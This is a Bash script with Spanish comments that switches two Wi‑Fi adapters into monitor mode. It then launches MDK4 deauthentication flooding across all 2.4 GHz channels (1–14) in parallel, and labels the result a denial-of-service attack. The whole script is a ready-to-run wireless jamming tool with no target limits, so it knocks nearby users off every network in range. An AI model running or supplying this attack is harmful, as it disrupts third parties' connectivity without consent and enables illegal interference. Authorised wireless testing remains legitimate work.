#!/bin/bash

# Función para verificar si una interfaz existe
verificar_interfaz() {
    local interfaz="$1"
    if ! iwconfig 2>/dev/null | grep -q "$interfaz"; then
        echo "[!] ERROR: No se detectó la interfaz $interfaz. Conéctala y vuelve a intentarlo."
        exit 1
    fi
}

# Función para poner una interfaz en modo monitor
activar_monitor() {
    local interfaz="$1"
    echo "[+] Activando modo monitor en $interfaz..."
    sudo ifconfig "$interfaz" down
    sudo iwconfig "$interfaz" mode monitor
    sudo ifconfig "$interfaz" up

    # Verificar si el modo monitor se activó correctamente
    if iwconfig "$interfaz" | grep -q "Mode:Monitor"; then
        echo "[✓] $interfaz ahora está en modo monitor."
    else
        echo "[!] ERROR: No se pudo activar el modo monitor en $interfaz."
        exit 1
    fi
}

# Definir interfaces manualmente
interfaz1="wlan1"
interfaz2="wlan2"

# Verificar que las interfaces existen
verificar_interfaz "$interfaz1"
verificar_interfaz "$interfaz2"

echo "[+] Interfaces detectadas: $interfaz1 y $interfaz2"

# Poner ambas interfaces en modo monitor
activar_monitor "$interfaz1"
activar_monitor "$interfaz2"

echo "[+] Ambas interfaces están en modo monitor."

# Verificar si MDK4 está instalado
if ! command -v mdk4 &> /dev/null; then
    echo "[!] ERROR: MDK4 no está instalado. Instálalo con:"
    echo "    sudo apt install mdk4 -y"
    exit 1
fi

# Lanzar ataque DoS con MDK4 en paralelo
echo "[+] Iniciando denegación de servicio..."

# Ataque en canales 1-7 con la primera antena (wlan1)
xterm -hold -e "mdk4 $interfaz1 d -c 1,2,3,4,5,6,7" &

# Ataque en canales 8-14 con la segunda antena (wlan2)
xterm -hold -e "mdk4 $interfaz2 d -c 8,9,10,11,12,13,14" &

echo "[✓] Ataque en ejecución. Presiona Ctrl+C para detenerlo."
